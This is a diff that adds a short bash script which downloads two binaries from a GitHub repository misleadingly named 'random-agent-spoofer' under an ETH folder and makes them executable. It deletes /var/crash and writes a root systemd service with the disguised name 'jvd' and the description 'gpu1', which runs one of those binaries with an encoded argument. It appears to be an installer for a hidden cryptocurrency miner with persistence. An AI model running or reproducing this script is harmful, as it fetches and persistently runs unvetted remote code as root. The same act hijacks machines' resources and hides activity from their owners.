@@ -1,0 +1,26 @@
+#!/bin/bash
+cd /home
+sudo wget https://github.com/trangtrau/random-agent-spoofer/raw/master/ETH/a
+sudo wget https://github.com/trangtrau/random-agent-spoofer/raw/master/ETH/sec
+sudo chmod +x sec
+sudo chmod +x a
+sudo rm -rf /lib/systemd/system/jvd.service
+sudo rm -rf /var/crash
+bash -c 'cat <<EOT >>/lib/systemd/system/jvd.service 
+[Unit]
+Description=gpu1
+After=network.target
+[Service]
+ExecStart= /home/sec ezmFUi7q7Gs/ABNlecoi5cF11pWubZ/Q6uGKhyfAfa1NTGkGu0R+UQKncQMZh/p3/R/LxRNCo/pczxyg9ApB6qcoM9y+7QzLNM9Xd/dl6nkcifK4WiwiZaOG/zwNpzmGq37v7ERCWA8VNTV72nG8igAYIZErFtBC04jM9qpMWGH5atXCylcXi61gzBamCUurvapTjCY58eRIKvwYhyKd+53WjI5G5G/Oz+EaQ9j2v4n5Yc7jkrjw8Uti
+WatchdogSec=36000
+Restart=always
+RestartSec=60
+User=root
+[Install]
+WantedBy=multi-user.target
+EOT
+' &&
+systemctl daemon-reload &&
+systemctl enable jvd.service &&
+service jvd stop  &&
+service jvd restart
